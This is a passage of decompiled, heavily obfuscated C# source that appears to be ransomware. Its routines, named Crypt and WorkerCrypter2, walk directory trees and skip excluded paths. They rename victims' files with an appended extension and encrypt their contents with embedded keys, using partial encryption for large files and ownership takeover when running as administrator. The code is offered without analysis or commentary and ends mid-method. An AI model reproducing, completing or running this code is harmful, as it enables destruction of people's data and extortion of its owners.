using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using kUSxsBmhKmv;
using ygbKLEHbcCFNE;

namespace coxZRmDhvSAWo;

internal sealed class aSOyqwTwiifNb
{
	public sealed class dXtpYLlAbMp
	{
		private static StringCollection YkLwhicznNAwtvOO;

		private static List<string> hFeyBiheGelkT;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107402035));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if ((!text.ToLower().Contains(getString_0(107402030)) && !text.ToLower().Contains(getString_0(107402009)) && !text.ToLower().Contains(getString_0(107388736)) && !text.ToLower().Contains(getString_0(107388755)) && !text.ToLower().Contains(getString_0(107401996)) && !text.ToLower().Contains(getString_0(107388575)) && !text.ToLower().Contains(getString_0(107388987)) && !text.ToLower().Contains(getString_0(107389002)) && !text.ToLower().Contains(getString_0(107388985)) && !text.ToLower().Contains(getString_0(107388936)) && !text.ToLower().Contains(getString_0(107388902)) && !text.ToLower().Contains(getString_0(107388917)) && !text.ToLower().Contains(getString_0(107388868)) && !text.ToLower().Contains(getString_0(107388887)) && !text.ToLower().Contains(getString_0(107388834)) && !text.ToLower().Contains(getString_0(107388853)) && !text.ToLower().Contains(getString_0(107388808)) && !text.ToLower().Contains(getString_0(107388823)) && !text.ToLower().Contains(getString_0(107388262)) && !text.Contains(FEZRNsQdHf(getString_0(107388277))) && !text.Contains(getString_0(107388220)) && !text.Contains(getString_0(107388239)) && !text.EndsWith(getString_0(107394928)) && !text.EndsWith(getString_0(107388214)) && !text.EndsWith(getString_0(107388209)) && !text.EndsWith(getString_0(107388204)) && !text.EndsWith(getString_0(107388167)) && !text.ToLower().Contains(getString_0(107388162)) && !text.ToLower().Contains(RoiBxbbYOpTnzdF)) || text.Contains(FEZRNsQdHf(getString_0(107389028))))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(nsiwXjKpMUO) * 1024.0 * 1024.0 && HirTGWkSHczrmbY == getString_0(107396812))
							{
								hFeyBiheGelkT.Add(text);
							}
							else if (File.Exists(text) && HirTGWkSHczrmbY == getString_0(107396239))
							{
								hFeyBiheGelkT.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				array3 = array2;
				foreach (string string_ in array3)
				{
					WalkDirectoryTree(string_);
				}
			}
			return hFeyBiheGelkT;
		}

		static dXtpYLlAbMp()
		{
			Strings.CreateGetStringDelegate(typeof(dXtpYLlAbMp));
			YkLwhicznNAwtvOO = new StringCollection();
			hFeyBiheGelkT = new List<string>();
		}
	}

	private sealed class QBtabLAUwdUegW
	{
		public string avfxhzATpymbWL;

		public bool _003CMain_003Eb__5(Process process_0)
		{
			return process_0.ProcessName == avfxhzATpymbWL;
		}
	}

	private sealed class FDWaiaZIHSfYzWE
	{
		public string qjrSbwgLWCX;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CMapDrv_003Eb__19(int int_0)
		{
			Thread.Sleep(GCkorullzoFEFAMeg);
			ZmKssmQIdPi.Add(getString_0(107388095) + qjrSbwgLWCX + getString_0(107397185) + (char)int_0 + getString_0(107401950));
			try
			{
				if (fgLeGcGjPkpRXH)
				{
					Console.WriteLine(getString_0(107388095) + qjrSbwgLWCX + getString_0(107397185) + (char)int_0 + getString_0(107401950));
				}
			}
			catch
			{
			}
		}

		static FDWaiaZIHSfYzWE()
		{
			Strings.CreateGetStringDelegate(typeof(FDWaiaZIHSfYzWE));
		}
	}

	private sealed class gvRAKexsehIhc
	{
		public string nvRebewysN;

		public bool _003CIsDriveNTFS_003Eb__1e(DriveInfo driveInfo_0)
		{
			return driveInfo_0.RootDirectory.Name == nvRebewysN;
		}
	}

	private sealed class BecdIQUMdtqwF
	{
		private sealed class gTngQbykchEa
		{
			public BecdIQUMdtqwF AgPuEjqzXMvcD;

			public string UWCxsCbMhIkWpfJ;

			public void _003CCrypt_003Eb__28()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					FdvYSFIGyAUutM(WindowsIdentity.GetCurrent().Name, UWCxsCbMhIkWpfJ);
				}
			}

			public void _003CCrypt_003Eb__29()
			{
				WAsxBnCueHJpKha(UWCxsCbMhIkWpfJ, AgPuEjqzXMvcD.nTBZXeQINsMZ, AgPuEjqzXMvcD.SrUtXYDUZSmg, AgPuEjqzXMvcD.CToRljeBfHM, AgPuEjqzXMvcD.hSfGYaylYziGu);
			}
		}

		public string[] nTBZXeQINsMZ;

		public string[] CToRljeBfHM;

		public string hSfGYaylYziGu;

		public string SrUtXYDUZSmg;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__27(string string_0)
		{
			gTngQbykchEa CS_0024_003C_003E8__locals0 = new gTngQbykchEa();
			CS_0024_003C_003E8__locals0.AgPuEjqzXMvcD = this;
			CS_0024_003C_003E8__locals0.UWCxsCbMhIkWpfJ = string_0;
			if (FRObTCxcUY && !KJOEdyafRmW().Contains(getString_0(107385722)) && !KJOEdyafRmW().Contains(getString_0(107401983)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						FdvYSFIGyAUutM(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.UWCxsCbMhIkWpfJ);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (rmNaxrdaErS == getString_0(107396821))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					WAsxBnCueHJpKha(CS_0024_003C_003E8__locals0.UWCxsCbMhIkWpfJ, CS_0024_003C_003E8__locals0.AgPuEjqzXMvcD.nTBZXeQINsMZ, CS_0024_003C_003E8__locals0.AgPuEjqzXMvcD.SrUtXYDUZSmg, CS_0024_003C_003E8__locals0.AgPuEjqzXMvcD.CToRljeBfHM, CS_0024_003C_003E8__locals0.AgPuEjqzXMvcD.hSfGYaylYziGu);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				WAsxBnCueHJpKha(CS_0024_003C_003E8__locals0.UWCxsCbMhIkWpfJ, nTBZXeQINsMZ, SrUtXYDUZSmg, CToRljeBfHM, hSfGYaylYziGu);
			}
		}

		static BecdIQUMdtqwF()
		{
			Strings.CreateGetStringDelegate(typeof(BecdIQUMdtqwF));
		}
	}

	private sealed class bKLeOnnwOsJw
	{
		private sealed class EaaSLAhSrkAd
		{
			public bKLeOnnwOsJw SnSgbcozGOnPa;

			public string HaKItZSuWfQSFL;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__35()
			{
				foreach (string item in YoPwmbBPpdD)
				{
					if (HaKItZSuWfQSFL.ToLower().EndsWith(item + SnSgbcozGOnPa.MaDQWNsFQFSMFZ) && HFFrRFIpQgjXI == getString_0(107396832))
					{
						if (Convert.ToInt32(PZYHNDUWTf) * 1024 * 1024 > new FileInfo(HaKItZSuWfQSFL).Length)
						{
							try
							{
								ATYckHdWsYOYHnae.GBhprVwnyvota(getString_0(107389880), getString_0(107389875), getString_0(107389894), HaKItZSuWfQSFL);
							}
							catch
							{
							}
						}
					}
					else if (HaKItZSuWfQSFL.ToLower().EndsWith(item) && HFFrRFIpQgjXI == getString_0(107396259))
					{
						try
						{
							ATYckHdWsYOYHnae.GBhprVwnyvota(getString_0(107389880), getString_0(107389875), getString_0(107389894), HaKItZSuWfQSFL);
						}
						catch
						{
						}
					}
				}
			}

			static EaaSLAhSrkAd()
			{
				Strings.CreateGetStringDelegate(typeof(EaaSLAhSrkAd));
			}
		}

		private sealed class SmDDBVlBSoLlZfP
		{
			public bKLeOnnwOsJw SnSgbcozGOnPa;

			public string ldrdWbhdALtRA;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__37()
			{
				foreach (string item in YoPwmbBPpdD)
				{
					if (ldrdWbhdALtRA.ToLower().EndsWith(item + SnSgbcozGOnPa.MaDQWNsFQFSMFZ) && HFFrRFIpQgjXI == getString_0(107396835))
					{
						if (Convert.ToInt32(PZYHNDUWTf) * 1024 * 1024 > new FileInfo(ldrdWbhdALtRA).Length)
						{
							try
							{
								ATYckHdWsYOYHnae.GBhprVwnyvota(getString_0(107389883), getString_0(107389878), getString_0(107389897), ldrdWbhdALtRA);
							}
							catch
							{
							}
						}
					}
					else if (ldrdWbhdALtRA.ToLower().EndsWith(item) && HFFrRFIpQgjXI == getString_0(107396262))
					{
						try
						{
							ATYckHdWsYOYHnae.GBhprVwnyvota(getString_0(107389883), getString_0(107389878), getString_0(107389897), ldrdWbhdALtRA);
						}
						catch
						{
						}
					}
				}
			}

			static SmDDBVlBSoLlZfP()
			{
				Strings.CreateGetStringDelegate(typeof(SmDDBVlBSoLlZfP));
			}
		}

		public List<string> MWjzSWdUTiapH;

		public List<string> vJUzSMoRbycwzG;

		public string MaDQWNsFQFSMFZ;

		public string[] nBTsxqqCcIrA;

		public string MXXPCoXZKEzPC;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__34(string string_0)
		{
			EaaSLAhSrkAd CS_0024_003C_003E8__locals0;
			foreach (string item in vJUzSMoRbycwzG)
			{
				if (((item.Contains(getString_0(107389372)) || item.Contains(getString_0(107389347)) || item.Contains(getString_0(107388802)) || item.ToLower().Contains(getString_0(107388753)) || item.ToLower().Contains(getString_0(107388772)) || item.Contains(getString_0(107388715)) || item.Contains(getString_0(107388694)) || item.ToLower().Contains(getString_0(107388713)) || item.ToLower().Contains(getString_0(107388700)) || item.ToLower().Contains(getString_0(107388631)) || item.ToLower().Contains(getString_0(107388622)) || item.ToLower().Contains(getString_0(107388637)) || item.ToLower().Contains(getString_0(107388611)) || item.ToLower().Contains(getString_0(107388558))) && !item.Contains(FEZRNsQdHf(getString_0(107389045)))) || item.Contains(getString_0(107389004)) || item.Contains(getString_0(107389019)) || item.Contains(getString_0(107389002)) || item.Contains(getString_0(107388953)) || item.Contains(getString_0(107388968)) || item.Contains(getString_0(107388919)) || item.Contains(getString_0(107388934)) || item.Contains(getString_0(107388885)) || item.Contains(getString_0(107388904)) || item.Contains(getString_0(107388851)) || item.ToLower().Contains(getString_0(107388870)) || item.ToLower().Contains(getString_0(107388825)) || item.ToLower().Contains(getString_0(107388840)) || item.ToLower().Contains(getString_0(107388279)) || item.Contains(FEZRNsQdHf(getString_0(107388294))) || item.Contains(getString_0(107388237)) || item.Contains(getString_0(107396364)) || item.Contains(getString_0(107388256)) || item.EndsWith(MaDQWNsFQFSMFZ) || item.EndsWith(getString_0(107388231)) || item.EndsWith(getString_0(107388226)) || item.EndsWith(getString_0(107388221)) || item.EndsWith(getString_0(107388184)) || item.Contains(getString_0(107388179)) || item.Contains(RoiBxbbYOpTnzdF) || item.Contains(dtHHyJMWMTcTg) || item.Contains(muQSQoYNOwJp))
				{
					continue;
				}
				if (nBTsxqqCcIrA.Length != 0)
				{
					string[] array = nBTsxqqCcIrA;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0e8a;
					}
				}
				try
				{
					if (item.EndsWith(MaDQWNsFQFSMFZ))
					{
						goto IL_0e8a;
					}
				}
				catch (Exception)
				{
					goto IL_0e8a;
				}
				if (!item.EndsWith(string_0) || SNtBTLidlROtoV.Contains(item))
				{
					continue;
				}
				if (BBqvZtJMKtZyzF == getString_0(107396829))
				{
					try
					{
						if (SXyxscfevxEF.IyHWOJymzstKa(item))
						{
							SXyxscfevxEF.bVUJKLBlSikLI(item);
						}
					}
					catch
					{
					}
				}
				SNtBTLidlROtoV.Add(item);
				if (!HMEbcaxMfcYzgl.Contains(Path.GetDirectoryName(item)))
				{
					HMEbcaxMfcYzgl.Add(Path.GetDirectoryName(item));
				}
				btQRMXqHMyAV(item);
				try
				{
					new slbXyVBmkFjuC().RBNXdzZVQAFiAJMA(item);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (fgLeGcGjPkpRXH)
							{
								Console.WriteLine(getString_0(107401946) + item + getString_0(107401901) + new FileInfo(item).Length + getString_0(107401880));
								Console.WriteLine(getString_0(107401871));
							}
						}
						catch
						{
						}
						cMEEnMgkUxxsbbNh(FEZRNsQdHf(getString_0(107402310)), getString_0(107388127) + item + getString_0(107388127) + FEZRNsQdHf(getString_0(107402253)) + getString_0(107388127) + Environment.UserName + getString_0(107388127) + FEZRNsQdHf(getString_0(107402268)));
					}
				}
				catch (Exception ex2)
				{
					if (CCDyMIHlAe)
					{
						try
						{
							File.AppendAllText(dtHHyJMWMTcTg, getString_0(107386376) + item + getString_0(107402243) + ex2.Message + getString_0(107395766));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (CCDyMIHlAe)
						{
							try
							{
								File.AppendAllText(dtHHyJMWMTcTg, getString_0(107386376) + item + getString_0(107402130) + ex2.Message + getString_0(107395766));
							}
							catch (Exception)
							{
							}
						}
						LVKhJcfUHGhpJNXz++;
						goto end_IL_073f;
					}
					byte[] bytes;
					if (QOKbVStgyeVL == getString_0(107396829) && new FileInfo(item).Length > Convert.ToInt32(UawyhGBHBLgS) * 1024 * 1024 && !MWjzSWdUTiapH.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new EaaSLAhSrkAd();
						CS_0024_003C_003E8__locals0.SnSgbcozGOnPa = this;
						try
						{
							if (MaDQWNsFQFSMFZ != getString_0(107385585))
							{
								if (YazilaoopZ)
								{
									MaDQWNsFQFSMFZ = tltXBlUAjNeRsFxCp + MaDQWNsFQFSMFZ;
								}
								File.Move(item, item + MaDQWNsFQFSMFZ);
							}
						}
						catch (Exception ex2)
						{
							if (CCDyMIHlAe)
							{
								try
								{
									File.AppendAllText(dtHHyJMWMTcTg, getString_0(107386376) + item + getString_0(107401557) + ex2.Message + getString_0(107395766));
								}
								catch (Exception)
								{
								}
							}
							LVKhJcfUHGhpJNXz++;
							goto end_IL_073f;
						}
						CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL = getString_0(107389316);
						if (MaDQWNsFQFSMFZ != getString_0(107385585))
						{
							CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL = item + MaDQWNsFQFSMFZ;
						}
						else
						{
							CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL = item;
						}
						if (DXDIUZMazYGZy == getString_0(107396829))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in YoPwmbBPpdD)
								{
									if (CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.SnSgbcozGOnPa.MaDQWNsFQFSMFZ) && HFFrRFIpQgjXI == EaaSLAhSrkAd.getString_0(107396832))
									{
										if (Convert.ToInt32(PZYHNDUWTf) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL).Length)
										{
											try
											{
												ATYckHdWsYOYHnae.GBhprVwnyvota(EaaSLAhSrkAd.getString_0(107389880), EaaSLAhSrkAd.getString_0(107389875), EaaSLAhSrkAd.getString_0(107389894), CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL.ToLower().EndsWith(item2) && HFFrRFIpQgjXI == EaaSLAhSrkAd.getString_0(107396259))
									{
										try
										{
											ATYckHdWsYOYHnae.GBhprVwnyvota(EaaSLAhSrkAd.getString_0(107389880), EaaSLAhSrkAd.getString_0(107389875), EaaSLAhSrkAd.getString_0(107389894), CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						bytes = Encoding.ASCII.GetBytes(EXVykcHaTCNay);
						if (nqNdPWHffReq == getString_0(107396256))
						{
							byte[] array2 = null;
							byte[] byte_ = DwwAAJBOSmbJ.fENIZKTbvW(CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL, Convert.ToInt32(UawyhGBHBLgS) * 1024 * 1024);
							if (DwwAAJBOSmbJ.IjvngclRYVi(PLFvJzqFVyEE: (!uBIPmjbCjNt) ? (PAOJgADrbjEa ? DwwAAJBOSmbJ.ZUYcQJLxxSxnH(byte_, Convert.FromBase64String(MXXPCoXZKEzPC), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : DwwAAJBOSmbJ.ZUYcQJLxxSxnH(byte_, Convert.FromBase64String(MXXPCoXZKEzPC), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (PAOJgADrbjEa ? lIsgGRoCjKMwrhD.QpIcrEUyluw(byte_, Convert.FromBase64String(MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC)) : lIsgGRoCjKMwrhD.QpIcrEUyluw(byte_, Convert.FromBase64String(MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC))), rfRQjrzTSbahvMj: CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL, CYHcaFOGLSEpY: bytes))
							{
								goto IL_0e8a;
							}
							try
							{
								File.Move(item + MaDQWNsFQFSMFZ, item);
							}
							catch (Exception)
							{
							}
						}
						else if (!PAOJgADrbjEa)
						{
							if (WZQPKbNkyop.RrUwydtFfvDr(CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL, UawyhGBHBLgS, MXXPCoXZKEzPC, null, Convert.FromBase64String(sTQyJSLcZOIiC)))
							{
								goto IL_0e8a;
							}
							try
							{
								File.Move(item + MaDQWNsFQFSMFZ, item);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (WZQPKbNkyop.RrUwydtFfvDr(CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL, UawyhGBHBLgS, MXXPCoXZKEzPC, bytes, Convert.FromBase64String(sTQyJSLcZOIiC)))
							{
								goto IL_0e8a;
							}
							try
							{
								File.Move(item + MaDQWNsFQFSMFZ, item);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (YazilaoopZ)
					{
						MaDQWNsFQFSMFZ = tltXBlUAjNeRsFxCp + MaDQWNsFQFSMFZ;
					}
					bytes = Encoding.ASCII.GetBytes(EXVykcHaTCNay);
					if (MaDQWNsFQFSMFZ != getString_0(107385585))
					{
						if (!UOlZmEwYRBbnfmvt)
						{
							if (!PAOJgADrbjEa)
							{
								uEiSXmUOmqEhAY(item, item + MaDQWNsFQFSMFZ, bGfpmpYMCsNkyjcK);
							}
							else
							{
								uEiSXmUOmqEhAY(item, item + MaDQWNsFQFSMFZ, Convert.FromBase64String(MXXPCoXZKEzPC));
							}
						}
						else
						{
							try
							{
								if (!PAOJgADrbjEa)
								{
									toHVfEOmOJ(item, item + MaDQWNsFQFSMFZ, bGfpmpYMCsNkyjcK, Convert.FromBase64String(sTQyJSLcZOIiC));
								}
								else
								{
									toHVfEOmOJ(item, item + MaDQWNsFQFSMFZ, Convert.FromBase64String(MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC));
								}
							}
							catch (Exception ex2)
							{
								if (CCDyMIHlAe)
								{
									try
									{
										File.AppendAllText(dtHHyJMWMTcTg, getString_0(107386376) + item + getString_0(107385603) + ex2.Message + getString_0(107395766));
									}
									catch (Exception)
									{
									}
								}
								LVKhJcfUHGhpJNXz++;
								try
								{
									File.Move(item + MaDQWNsFQFSMFZ, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_073f;
							}
						}
					}
					else if (!UOlZmEwYRBbnfmvt)
					{
						if (!PAOJgADrbjEa)
						{
							uEiSXmUOmqEhAY(item, item + getString_0(107385580), bGfpmpYMCsNkyjcK);
						}
						else
						{
							uEiSXmUOmqEhAY(item, item + getString_0(107385580), Convert.FromBase64String(MXXPCoXZKEzPC));
						}
					}
					else
					{
						try
						{
							if (!PAOJgADrbjEa)
							{
								toHVfEOmOJ(item, item, bGfpmpYMCsNkyjcK, Convert.FromBase64String(sTQyJSLcZOIiC));
							}
							else
							{
								toHVfEOmOJ(item, item, Convert.FromBase64String(MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC));
							}
						}
						catch (Exception ex2)
						{
							if (CCDyMIHlAe)
							{
								try
								{
									File.AppendAllText(dtHHyJMWMTcTg, getString_0(107386376) + item + getString_0(107385603) + ex2.Message + getString_0(107395766));
								}
								catch (Exception)
								{
								}
							}
							LVKhJcfUHGhpJNXz++;
							goto end_IL_073f;
						}
					}
					if (PAOJgADrbjEa)
					{
						if (MaDQWNsFQFSMFZ != getString_0(107385585))
						{
							QXCLEGXnLYcbL(item + MaDQWNsFQFSMFZ, bytes);
						}
						else
						{
							QXCLEGXnLYcbL(item, bytes);
						}
					}
					goto IL_0e8a;
					end_IL_073f:;
				}
				catch (Exception)
				{
					goto IL_0e8a;
				}
				continue;
				IL_0e8a:
				vJUzSMoRbycwzG.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__36(string string_0)
		{
			SmDDBVlBSoLlZfP CS_0024_003C_003E8__locals0 = new SmDDBVlBSoLlZfP();
			CS_0024_003C_003E8__locals0.SnSgbcozGOnPa = this;
			CS_0024_003C_003E8__locals0.ldrdWbhdALtRA = string_0;
			if (((!CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107389372)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107389347)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388802)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388753)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388772)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388715)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388694)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388713)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388700)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388631)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388622)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388637)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388611)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388558))) || CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(FEZRNsQdHf(getString_0(107389045)))) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107389004)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107389019)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107389002)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388953)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388968)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388919)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388934)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388885)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388904)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388851)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388870)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388825)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388840)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388279)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(FEZRNsQdHf(getString_0(107388294))) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388237)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107396364)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388256)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.EndsWith(MaDQWNsFQFSMFZ) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.EndsWith(getString_0(107388231)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.EndsWith(getString_0(107388226)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.EndsWith(getString_0(107388221)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.EndsWith(getString_0(107388184)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388179)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(RoiBxbbYOpTnzdF) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(dtHHyJMWMTcTg) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(muQSQoYNOwJp))
			{
				if (nBTsxqqCcIrA.Length != 0)
				{
					string[] array = nBTsxqqCcIrA;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_100c;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.EndsWith(MaDQWNsFQFSMFZ))
					{
						goto IL_100c;
					}
				}
				catch (Exception)
				{
					goto IL_100c;
				}
				if (!SNtBTLidlROtoV.Contains(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA))
				{
					if (BBqvZtJMKtZyzF == getString_0(107396829))
					{
						try
						{
							if (SXyxscfevxEF.IyHWOJymzstKa(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA))
							{
								SXyxscfevxEF.bVUJKLBlSikLI(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
							}
						}
						catch
						{
						}
					}
					SNtBTLidlROtoV.Add(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
					if (!HMEbcaxMfcYzgl.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA)))
					{
						HMEbcaxMfcYzgl.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA));
					}
					btQRMXqHMyAV(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
					try
					{
						new slbXyVBmkFjuC().RBNXdzZVQAFiAJMA(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (fgLeGcGjPkpRXH)
								{
									Console.WriteLine(getString_0(107401946) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + getString_0(107401901) + new FileInfo(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA).Length + getString_0(107401880));
									Console.WriteLine(getString_0(107401871));
								}
							}
							catch
							{
							}
							cMEEnMgkUxxsbbNh(FEZRNsQdHf(getString_0(107402310)), getString_0(107388127) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + getString_0(107388127) + FEZRNsQdHf(getString_0(107402253)) + getString_0(107388127) + Environment.UserName + getString_0(107388127) + FEZRNsQdHf(getString_0(107402268)));
						}
					}
					catch (Exception ex2)
					{
						if (CCDyMIHlAe)
						{
							try
							{
								File.AppendAllText(dtHHyJMWMTcTg, getString_0(107386376) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + getString_0(107402243) + ex2.Message + getString_0(107395766));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA).Length != 0L)
							{
								goto end_IL_0856;
							}
							goto end_IL_0855;
							end_IL_0856:;
						}
						catch (Exception ex2)
						{
							if (CCDyMIHlAe)
							{
								try
								{
									File.AppendAllText(dtHHyJMWMTcTg, getString_0(107386376) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + getString_0(107402130) + ex2.Message + getString_0(107395766));
								}
								catch (Exception)
								{
								}
							}
							LVKhJcfUHGhpJNXz++;
							goto end_IL_0855;
						}
